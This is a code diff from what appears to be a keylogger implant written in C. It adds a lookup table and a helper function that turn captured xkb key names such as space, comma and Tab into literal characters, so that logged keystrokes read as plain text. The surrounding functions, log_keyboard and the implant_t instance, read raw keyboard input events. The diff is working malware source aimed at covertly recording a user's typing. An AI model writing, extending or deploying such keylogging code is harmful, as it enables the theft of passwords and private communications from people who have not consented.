@@ -17,6 +17,25 @@
 #include <xkbcommon/xkbcommon.h>
 
 
+static const translated_key_t KEYS[] = {
+    { "space", ' ' },
+    { "comma", ',' },
+    { "period", '.' },
+    { "slash", '/' },
+    { "questionmark", '?' },
+    { "semicolon", ';' },
+    { "apostrophe", '\'' },
+    { "bracketleft", '[' },
+    { "bracketright", ']' },
+    { "backslash", '\\' },
+    { "pipe", '|' },
+    { "Tab", '\t' },
+    { "minus", '-'},
+    { "plus", '+'},
+    { "equal", '='},
+    { NULL, 0 },
+};
+
 static int get_highest_fd(implant_t *instance) {
     int highest_fd = -1;
 
@@ -26,6 +45,21 @@ static int get_highest_fd(implant_t *instance) {
     }
     return highest_fd;
 }
+
+
+static char *check_translated_key(char *key_desc) {
+    for (size_t ctr = 0; KEYS[ctr].description != NULL; ctr++) {
+        if (!strcmp(KEYS[ctr].description, key_desc)) {
+
+            memset(key_desc, 0, STRING_BUFFER_SIZE);
+            key_desc[0] = KEYS[ctr].representation;
+
+            break;
+        }
+    }
+    return key_desc;
+}
+
 
 static int log_keyboard(int fd, struct xkb_state *state, char **key_desc_ptr) {
     struct input_event evt = {0};
@@ -88,11 +122,7 @@ static int log_keyboard(int fd, struct xkb_state *state, char **key_desc_ptr) {
         memset(*key_desc_ptr, 0, STRING_BUFFER_SIZE);
         xkb_keysym_get_name(keysym, *key_desc_ptr, STRING_BUFFER_SIZE);
 
-        if (!strcmp("space", *key_desc_ptr)) {
-            memset(*key_desc_ptr, 0, STRING_BUFFER_SIZE);
-            *key_desc_ptr[0] = ' ';
-        }
-
+        *key_desc_ptr = check_translated_key(*key_desc_ptr);
     }
 
     return SUCCESSFUL;
